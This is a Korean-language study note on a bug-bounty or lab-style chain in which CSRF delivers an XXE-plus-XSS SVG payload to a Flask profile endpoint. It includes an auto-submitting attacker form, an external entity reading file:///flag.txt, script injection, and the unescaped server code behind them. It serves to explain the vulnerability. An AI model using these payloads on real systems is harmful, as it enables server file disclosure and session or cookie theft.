# csrf2xss-via-XXE_ver2

---

버그바운티 케이스 분석

---

### 전체 구성

- 시나리오
    
    ```bash
    ┌───────────────┐
    │ 공격자 사이트 │
    └───────┬───────┘
            │
            │ CSRF HTML
            │ (자동 제출 form)
            │
            ▼
    ┌─────────────────────────────┐
    │ 피해자 브라우저 (로그인中)   │
    └──────────┬──────────────────┘
               │
               │ POST /profile/update
               │ profileXML = 
               │   └ SVG/XML payload
               │      - XXE 선언
               │      - XSS 스크립트 포함
               │
               ▼
    ┌─────────────────────────────┐
    │ Flask 서버                   │
    ├─────────────────────────────┤
    │ 1. profileXML 수신          │
    │ 2. xmltodict.parse() 호출   │
    │    └ XXE 발동               │
    │       (ex. /flag.txt 읽음)   │
    │ 3. 파싱 결과 HTML 출력      │
    │    └ Escape 안 함           │
    └──────────┬──────────────────┘
               │
               │ Response:
               │ Hello <script>...</script>FLAG{...}
               │
               ▼
    ┌─────────────────────────────┐
    │ 피해자 브라우저              │
    ├─────────────────────────────┤
    │ 1. XSS 스크립트 실행         │
    │    └ fetch(...)              │
    │       → 공격자 서버로 쿠키  │
    │ 2. FLAG 화면에 노출         │
    └─────────────────────────────┘
    
    ```
    

---

## CSRF2XSS

```bash
<form action="https://target.com/profile/update" method="POST">
  <input type="hidden" name="name" value="<script>alert(1)</script>">
</form>

<script>
  document.forms[0].submit();
</script>
```

→ 피해자 세션으로 이 요청이 전송됨.

→ 서버가 name을 저장하거나 화면에 출력할 때 Escape 안 하면

```
Hello <script>alert(1)</script>!
```

→ **XSS 터짐.**

> “SVG를 통해 XSS 실행을 위한 JS 코드를 XML로 주입하고, 이걸 통해 CSRF-XSS를 터트리는 버그바운티 케이스이다.”
> 

---

### 🔥 전체 시나리오

### (1) 공격자가 CSRF 페이지를 만든다

- 공격자 사이트에 아래 HTML 폼을 숨겨놓음

```html
html
복사편집
<html>
  <body onload="document.forms[0].submit()">
    <form action="http://target:5000/profile/update" method="POST">
      <input type="hidden" name="profileXML" value="
        <?xml version='1.0' standalone='yes'?>
        <!DOCTYPE foo [
          <!ENTITY xxe SYSTEM 'file:///flag.txt'>
        ]>
        <svg xmlns='http://www.w3.org/2000/svg'>
          <text><![CDATA[
            <script>alert('XSS')</script>&xxe;
          ]]></text>
        </svg>
      ">
    </form>
  </body>
</html>

```

- **CSRF가 하는 역할** →
    
    피해자가 로그인된 상태에서 위 페이지를 방문하게 만드는 것
    
    → 피해자 세션 쿠키가 자동 전송됨
    

---

### (2) 피해자가 페이지를 열자마자 submit

→ 피해자 세션으로 아래 요청이 서버로 전송됨

```bash

POST /profile/update
Content-Type: application/x-www-form-urlencoded

profileXML=<?xml ... SVG payload ...>

```

---

### (3) 서버가 profileXML을 파싱

- 서버 코드:
    
    ```python
    
    xml_payload = request.form.get("profileXML")
    parsed_data = xmltodict.parse(xml_payload)
    text = parsed_data["svg"]["text"]
    
    ```
    
- 이때 `&xxe;` 가 `/flag.txt` 내용으로 대체됨 (XXE)

→ 파싱된 값:

```html

<script>alert('XSS')</script>FLAG{xxe_success}

```

---

### (4) 서버가 HTML에 그대로 출력

예)

```python

html_response = f"Hello {text}!"

```

→ 응답:

```php

Hello <script>alert('XSS')</script>FLAG{xxe_success}!

```

- 여기서 **XSS가 발동**
    - 피해자 브라우저에서 alert 뜸
    - 쿠키 탈취 가능





## ref: 
[Unveiling CSRF-to-XSS and XXE in a Single Request](https://medium.com/@nocley/b3e260d5477d)
